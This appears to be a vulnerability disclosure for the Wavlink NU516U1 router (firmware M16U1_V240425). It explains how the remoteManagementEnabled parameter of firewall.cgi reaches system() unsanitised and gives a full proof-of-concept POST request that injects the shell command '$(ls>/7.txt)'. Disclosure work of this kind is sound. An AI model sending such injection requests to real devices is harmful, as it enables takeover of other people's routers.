# Wavlink NU516 websSysFirewall
### Overview
vendor: Wavlink

product: NU516U1

version: M16U1_V240425

type: Command Injection
### Vulnerability Description
Wavlink NU516U1 M16U1_V240425 were discovered to contain a command injection via the remoteManagementEnabled parameter in the sub_401B30 function of the file firewall.cgi.
### Vulnerability details
In the ftext function, obtain the value of the firewall parameter via user input.

![](images/12.png)

Setting the value of the firewall parameter to websSysFirewall will call the sub_401B30 function.

![](images/16.png)

In the sub_401B30 function, the value of the remoteManagementEnabled parameter is obtained via a post request. Then, the value of the remoteManagementEnabled parameter is passed to the v12 variable via the sprintf function, which in turn is passed to the system function.

![](images/17.png)

### POC
```
POST /cgi-bin/firewall.cgi HTTP/1.1
Host: 192.168.0.1
Content-Length: 133
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.0.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.0.1/html/networkSetting.shtml
Accept-Encoding: gzip, deflate, br
Cookie: session=1938672303
Connection: keep-alive

firewall=websSysFirewall&blockSynFloodEnabled=1&pingFrmWANFilterEnabled=1&blockPortScanEnabled=1&remoteManagementEnabled=$(ls>/7.txt)
```
